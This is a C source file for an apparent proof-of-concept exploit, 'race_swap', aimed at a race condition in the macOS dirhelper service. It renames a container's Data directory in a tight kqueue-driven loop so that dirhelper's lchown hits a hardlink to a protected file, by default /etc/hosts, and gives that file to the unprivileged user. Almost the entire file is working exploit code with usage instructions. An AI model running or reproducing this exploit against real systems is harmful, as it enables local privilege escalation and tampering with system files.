/*
 * race_swap.c - Glarus PoC Component (FIXED - uses rename instead of symlink)
 * 
 * TOCTOU race condition exploit for macOS dirhelper vulnerability.
 * 
 * This component monitors the container Data directory for the creation
 * of the "tmp" subdirectory by dirhelper, then rapidly swaps the Data
 * directory with the Fake directory containing a hardlink to the target file.
 * 
 * Race Condition:
 *   dirhelper: mkdir("Data/tmp")    [creates directory]
 *                    |
 *                    | <-- RACE WINDOW (~10-100 microseconds)
 *                    |
 *   dirhelper: lchown("Data/tmp")   [changes ownership]
 *                    |
 *   attacker:  rename Data -> Data_backup
 *              rename Fake -> Data   <-- NOT symlink!
 *                    |
 *   Result:    lchown operates on Fake/tmp (our hardlink to target)
 * 
 * Compilation:
 *   clang -O3 -o race_swap race_swap.c
 * 
 * Usage:
 *   ./race_swap -c com.glarus.poc -m spin -n 50000 -t /etc/hosts
 * 
 * Copyright (c) 2025 Golden Helm Securities
 * For authorized security research only.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <spawn.h>
#include <sys/stat.h>
#include <sys/event.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <pwd.h>

extern char **environ;

/*
 * Configuration
 */
#define DEFAULT_TARGET      "/etc/hosts"
#define DEFAULT_ATTEMPTS    5000
#define SWAP_SPIN_ITERS     50      /* Brief spin after swap for lchown to execute */

/*
 * Global State
 */
static volatile int g_running = 1;

static char g_container_name[256];
static char g_container_base[1024];
static char g_data_dir[1024];
static char g_data_backup[1024];
static char g_fake_dir[1024];
static char g_target_path[1024];   /* Data/tmp - what we monitor */
static char g_target_file[1024];   /* The file we want to own */
static char g_client_path[1024];   /* Path to DirhelperClient */
static char g_buffer_size_str[16]; /* Buffer size for truncation */

static uid_t g_my_uid;
static uid_t g_target_uid;         /* Original owner of target file */

/* Statistics */
static int g_triggers = 0;
static int g_detections = 0;
static int g_swaps = 0;
static int g_swap_failures = 0;

/*
 * Signal handler
 */
static void signal_handler(int sig) {
    (void)sig;
    g_running = 0;
}

/*
 * Check if we won the race
 */
static int check_win(void) {
    struct stat st;
    if (stat(g_target_file, &st) == 0) {
        return st.st_uid == g_my_uid;
    }
    return 0;
}

/*
 * Atomic directory swap using rename()
 * 
 * SPEED IS CRITICAL HERE - every microsecond counts.
 * We use two renames:
 *   rename(Data, Data_backup)  
 *   rename(Fake, Data)
 * 
 * After this, "Data/tmp" resolves to what was "Fake/tmp" (our hardlink).
 */
static inline int do_swap(void) {
    if (rename(g_data_dir, g_data_backup) != 0) {
        g_swap_failures++;
        return -1;
    }
    
    if (rename(g_fake_dir, g_data_dir) != 0) {
        g_swap_failures++;
        /* Try to restore */
        rename(g_data_backup, g_data_dir);
        return -1;
    }
    
    g_swaps++;
    return 0;
}

/*
 * Undo swap and prepare for next attempt
 */
static void undo_swap(void) {
    char tmp_path[1024];
    struct stat st;
    
    /* Move current Data (was Fake) back to Fake */
    if (lstat(g_data_dir, &st) == 0) {
        rename(g_data_dir, g_fake_dir);
    }
    
    /* Restore Data_backup to Data */
    if (lstat(g_data_backup, &st) == 0) {
        rename(g_data_backup, g_data_dir);
    }
    
    /* Remove tmp from Data (dirhelper created it) */
    snprintf(tmp_path, sizeof(tmp_path), "%s/tmp", g_data_dir);
    rmdir(tmp_path);
    
    /* Remove tmp from Fake and recreate hardlink */
    snprintf(tmp_path, sizeof(tmp_path), "%s/tmp", g_fake_dir);
    unlink(tmp_path);  /* Remove file/dir */
    rmdir(tmp_path);   /* In case it's a directory */
    link(g_target_file, tmp_path);  /* Recreate hardlink */
}

/*
 * Trigger dirhelper via the client binary
 * Uses posix_spawn for speed (faster than fork+exec)
 */
static int trigger_dirhelper(void) {
    pid_t pid;
    int status;
    
    char *argv[] = {
        "DirhelperClient",
        (char *)g_container_name,
        "1",  /* type = container */
        (char *)g_buffer_size_str,
        NULL
    };
    
    posix_spawn_file_actions_t actions;
    posix_spawn_file_actions_init(&actions);
    /* Redirect stdout/stderr to /dev/null for speed */
    posix_spawn_file_actions_addopen(&actions, STDOUT_FILENO, "/dev/null", O_WRONLY, 0);
    posix_spawn_file_actions_addopen(&actions, STDERR_FILENO, "/dev/null", O_WRONLY, 0);
    
    if (posix_spawn(&pid, g_client_path, &actions, NULL, argv, environ) != 0) {
        posix_spawn_file_actions_destroy(&actions);
        return -1;
    }
    
    posix_spawn_file_actions_destroy(&actions);
    g_triggers++;
    
    /* Don't wait - let it run async. We'll detect via kqueue. */
    /* But we do need to reap it eventually to avoid zombies */
    waitpid(pid, &status, WNOHANG);
    
    return 0;
}

/*
 * Reap any zombie child processes
 */
static void reap_children(void) {
    while (waitpid(-1, NULL, WNOHANG) > 0) {
        /* Keep reaping */
    }
}

/*
 * Main integrated trigger-race loop
 * 
 * This is the key fix. Instead of separate trigger and race loops,
 * we do:
 *   1. Setup kqueue on Data directory
 *   2. Trigger dirhelper
 *   3. Wait on kqueue with short timeout
 *   4. On event: IMMEDIATELY swap
 *   5. Check if won
 *   6. Undo and repeat
 */
static int race_integrated(int max_attempts) {
    int kq = -1;
    int data_fd = -1;
    struct kevent change, event;
    struct stat st;
    int attempt = 0;
    char tmp_path[1024];
    struct timespec timeout = { 0, 10000000 };  /* 10ms timeout */
    
    snprintf(tmp_path, sizeof(tmp_path), "%s/tmp", g_data_dir);
    
    printf("[*] Race mode: INTEGRATED (trigger + race synchronized)\n");
    printf("[*] Client:    %s\n", g_client_path);
    printf("[*] Target:    %s\n", g_target_file);
    printf("[*] Buffer:    %s bytes (triggers truncation)\n\n", g_buffer_size_str);
    
    /* Create kqueue */
    kq = kqueue();
    if (kq < 0) {
        perror("kqueue");
        return 1;
    }
    
    printf("[*] Starting integrated trigger-race loop...\n");
    printf("[*] Each trigger gets full attention (no more missed windows)\n\n");
    
    while (g_running && attempt < max_attempts) {
        attempt++;
        
        /* Ensure Data directory exists and is clean */
        rmdir(tmp_path);  /* Remove any leftover tmp */
        
        /* Open Data directory for monitoring */
        data_fd = open(g_data_dir, O_RDONLY | O_EVTONLY);
        if (data_fd < 0) {
            /* Data might be in wrong state, try to recover */
            undo_swap();
            usleep(1000);
            continue;
        }
        
        /* Register for directory write events (mkdir will trigger this) */
        EV_SET(&change, data_fd, EVFILT_VNODE, EV_ADD | EV_CLEAR | EV_ONESHOT,
               NOTE_WRITE, 0, NULL);
        
        if (kevent(kq, &change, 1, NULL, 0, NULL) < 0) {
            close(data_fd);
            continue;
        }
        
        /* 
         * CRITICAL SECTION START
         * We're now monitoring. Trigger dirhelper and race!
         */
        
        /* Trigger dirhelper - it will mkdir(Data/tmp) then lchown(Data/tmp) */
        if (trigger_dirhelper() != 0) {
            close(data_fd);
            continue;
        }
        
        /* Wait for kqueue event (mkdir happened) */
        int n = kevent(kq, NULL, 0, &event, 1, &timeout);
        
        if (n > 0 && (event.fflags & NOTE_WRITE)) {
            g_detections++;
            
            /* mkdir() just happened - SWAP NOW before lchown()! */
            if (do_swap() == 0) {
                /* 
                 * Swap succeeded!
                 * Now "Data/tmp" points to our hardlink.
                 * lchown() should execute on it momentarily.
                 * 
                 * Brief spin to let lchown complete.
                 */
                for (volatile int i = 0; i < SWAP_SPIN_ITERS; i++) {
                    __asm__ volatile("" ::: "memory");
                }
                
                /* Check if we won */
                if (check_win()) {
                    close(data_fd);
                    close(kq);
                    reap_children();
                    
                    printf("\n\n");
                    printf("╔══════════════════════════════════════════════════════════════╗\n");
                    printf("║                    🎉 RACE WON! 🎉                           ║\n");
                    printf("╚══════════════════════════════════════════════════════════════╝\n\n");
                    printf("Target file: %s\n", g_target_file);
                    printf("New owner:   uid=%d (you)\n", g_my_uid);
                    printf("Statistics:\n");
                    printf("  Attempts:   %d\n", attempt);
                    printf("  Triggers:   %d\n", g_triggers);
                    printf("  Detections: %d\n", g_detections);
                    printf("  Swaps:      %d\n", g_swaps);
                    printf("\n");
                    return 0;
                }
                
                /* Didn't win - undo and try again */
                undo_swap();
            }
        }
        
        close(data_fd);
        
        /* Progress */
        if (attempt % 100 == 0) {
            printf("\r[*] Attempt %d/%d (triggers=%d, detections=%d, swaps=%d)   ",
                   attempt, max_attempts, g_triggers, g_detections, g_swaps);
            fflush(stdout);
            reap_children();
        }
    }
    
    close(kq);
    reap_children();
    
    printf("\n\n[!] Race did not succeed after %d attempts\n", attempt);
    printf("[!] Statistics: triggers=%d, detections=%d, swaps=%d, failures=%d\n",
           g_triggers, g_detections, g_swaps, g_swap_failures);
    
    return 1;
}

/*
 * Legacy spin-based race (for comparison/fallback)
 * This is the OLD broken approach - triggers come from external script
 */
static int race_spin_legacy(int max_attempts) {
    struct stat st;
    int attempt = 0;
    unsigned long spins = 0;
    char tmp_path[1024];
    
    snprintf(tmp_path, sizeof(tmp_path), "%s/tmp", g_data_dir);
    
    printf("[*] Race mode: SPIN (legacy - requires external triggers)\n");
    printf("[*] Monitoring: %s\n", g_target_path);
    printf("[*] WARNING: This mode has synchronization issues!\n\n");
    
    while (g_running && attempt < max_attempts) {
        spins++;
        
        if (stat(g_target_path, &st) == 0) {
            attempt++;
            g_detections++;
            
            if (do_swap() == 0) {
                for (volatile int i = 0; i < SWAP_SPIN_ITERS; i++) {
                    __asm__ volatile("" ::: "memory");
                }
                
                if (check_win()) {
                    printf("\n[!] RACE WON! (legacy mode)\n");
                    return 0;
                }
                
                undo_swap();
            } else {
                rmdir(tmp_path);
            }
        }
        
        if (spins % 1000000 == 0) {
            printf("\r[*] Spinning... (detections=%d, swaps=%d)", g_detections, g_swaps);
            fflush(stdout);
        }
    }
    
    printf("\n[!] Race did not succeed (legacy mode)\n");
    return 1;
}

static void usage(const char *prog) {
    printf("Glarus Race Swap - TOCTOU Exploit (FIXED)\n\n");
    printf("Usage: %s [options]\n\n", prog);
    printf("Options:\n");
    printf("  -c <bundle>   Container bundle ID (REQUIRED)\n");
    printf("  -t <file>     Target file to own (default: %s)\n", DEFAULT_TARGET);
    printf("  -n <attempts> Maximum attempts (default: %d)\n", DEFAULT_ATTEMPTS);
    printf("  -p <path>     Path to DirhelperClient binary (REQUIRED for integrated mode)\n");
    printf("  -b <size>     Buffer size for truncation (auto-calculated if not set)\n");
    printf("  -m <mode>     Mode: integrated (default), spin (legacy)\n");
    printf("  -h            Show this help\n\n");
    printf("IMPORTANT: The 'integrated' mode fixes the synchronization bug.\n");
    printf("           The 'spin' mode is the legacy broken approach.\n\n");
}

static void cleanup(void) {
    struct stat st;
    
    /* Restore Data if needed */
    if (lstat(g_data_dir, &st) != 0 && lstat(g_data_backup, &st) == 0) {
        rename(g_data_backup, g_data_dir);
    }
    
    reap_children();
}

int main(int argc, char *argv[]) {
    char *home;
    const char *container = NULL;
    const char *target = DEFAULT_TARGET;
    const char *client_path = NULL;
    const char *mode = "integrated";
    int max_attempts = DEFAULT_ATTEMPTS;
    int buffer_size = 0;
    int opt;
    struct stat st;
    
    while ((opt = getopt(argc, argv, "c:t:n:p:b:m:h")) != -1) {
        switch (opt) {
            case 'c': container = optarg; break;
            case 't': target = optarg; break;
            case 'n': max_attempts = atoi(optarg); break;
            case 'p': client_path = optarg; break;
            case 'b': buffer_size = atoi(optarg); break;
            case 'm': mode = optarg; break;
            case 'h':
            default:
                usage(argv[0]);
                return (opt == 'h') ? 0 : 1;
        }
    }
    
    if (!container) {
        fprintf(stderr, "ERROR: Container bundle ID required (-c)\n");
        usage(argv[0]);
        return 1;
    }
    
    if (strcmp(mode, "integrated") == 0 && !client_path) {
        fprintf(stderr, "ERROR: DirhelperClient path required for integrated mode (-p)\n");
        usage(argv[0]);
        return 1;
    }
    
    /* Store config */
    strncpy(g_container_name, container, sizeof(g_container_name) - 1);
    strncpy(g_target_file, target, sizeof(g_target_file) - 1);
    if (client_path) {
        strncpy(g_client_path, client_path, sizeof(g_client_path) - 1);
    }
    
    g_my_uid = getuid();
    
    /* Get home directory */
    home = getenv("HOME");
    if (!home) {
        struct passwd *pw = getpwuid(g_my_uid);
        if (pw) home = pw->pw_dir;
    }
    if (!home) {
        fprintf(stderr, "ERROR: Cannot determine home directory\n");
        return 1;
    }
    
    /* Build paths */
    snprintf(g_container_base, sizeof(g_container_base),
             "%s/Library/Containers/%s", home, g_container_name);
    snprintf(g_data_dir, sizeof(g_data_dir), "%s/Data", g_container_base);
    snprintf(g_data_backup, sizeof(g_data_backup), "%s/Data_backup", g_container_base);
    snprintf(g_fake_dir, sizeof(g_fake_dir), "%s/Fake", g_container_base);
    snprintf(g_target_path, sizeof(g_target_path), "%s/tmp", g_data_dir);
    
    /* Calculate buffer size for truncation if not provided */
    if (buffer_size == 0) {
        buffer_size = strlen(g_data_dir) + 5;  /* +5 for "/tmp" + some margin */
    }
    snprintf(g_buffer_size_str, sizeof(g_buffer_size_str), "%d", buffer_size);
    
    /* Print banner */
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║  Glarus Race Swap - TOCTOU Exploit (FIXED)                   ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n\n");
    
    printf("Configuration:\n");
    printf("  Bundle ID:    %s\n", g_container_name);
    printf("  Data dir:     %s\n", g_data_dir);
    printf("  Fake dir:     %s\n", g_fake_dir);
    printf("  Target file:  %s\n", g_target_file);
    printf("  Mode:         %s\n", mode);
    printf("  Max attempts: %d\n\n", max_attempts);
    
    /* Verify setup */
    printf("[*] Verifying setup...\n");
    
    if (stat(g_data_dir, &st) != 0 || !S_ISDIR(st.st_mode)) {
        fprintf(stderr, "    ✗ Data directory missing or invalid\n");
        return 1;
    }
    printf("    ✓ Data directory exists\n");
    
    if (stat(g_fake_dir, &st) != 0 || !S_ISDIR(st.st_mode)) {
        fprintf(stderr, "    ✗ Fake directory missing\n");
        return 1;
    }
    printf("    ✓ Fake directory exists\n");
    
    char fake_tmp[1024];
    snprintf(fake_tmp, sizeof(fake_tmp), "%s/tmp", g_fake_dir);
    if (stat(fake_tmp, &st) != 0) {
        fprintf(stderr, "    ✗ Fake/tmp (hardlink) missing\n");
        return 1;
    }
    ino_t fake_ino = st.st_ino;
    printf("    ✓ Fake/tmp exists (inode: %llu)\n", (unsigned long long)fake_ino);
    
    if (stat(g_target_file, &st) != 0) {
        fprintf(stderr, "    ✗ Target file missing\n");
        return 1;
    }
    g_target_uid = st.st_uid;
    
    if (st.st_ino != fake_ino) {
        fprintf(stderr, "    ✗ Hardlink verification failed (inodes don't match)\n");
        return 1;
    }
    printf("    ✓ Hardlink verified (same inode as target)\n");
    
    if (client_path) {
        if (access(g_client_path, X_OK) != 0) {
            fprintf(stderr, "    ✗ DirhelperClient not found or not executable: %s\n", g_client_path);
            return 1;
        }
        printf("    ✓ DirhelperClient found\n");
    }
    
    /* Clean up stale backup */
    if (lstat(g_data_backup, &st) == 0) {
        printf("[*] Removing stale Data_backup...\n");
        char cmd[2048];
        snprintf(cmd, sizeof(cmd), "rm -rf '%s'", g_data_backup);
        system(cmd);
    }
    
    printf("\n");
    
    /* Setup signal handlers */
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    atexit(cleanup);
    
    /* Run appropriate mode */
    int result;
    if (strcmp(mode, "integrated") == 0) {
        result = race_integrated(max_attempts);
    } else if (strcmp(mode, "spin") == 0) {
        result = race_spin_legacy(max_attempts);
    } else {
        fprintf(stderr, "Unknown mode: %s\n", mode);
        return 1;
    }
    
    if (result == 0) {
        printf("\nFinal file ownership:\n");
        char cmd[1200];
        snprintf(cmd, sizeof(cmd), "ls -la '%s'", g_target_file);
        system(cmd);
        printf("\n");
    }
    
    return result;
}
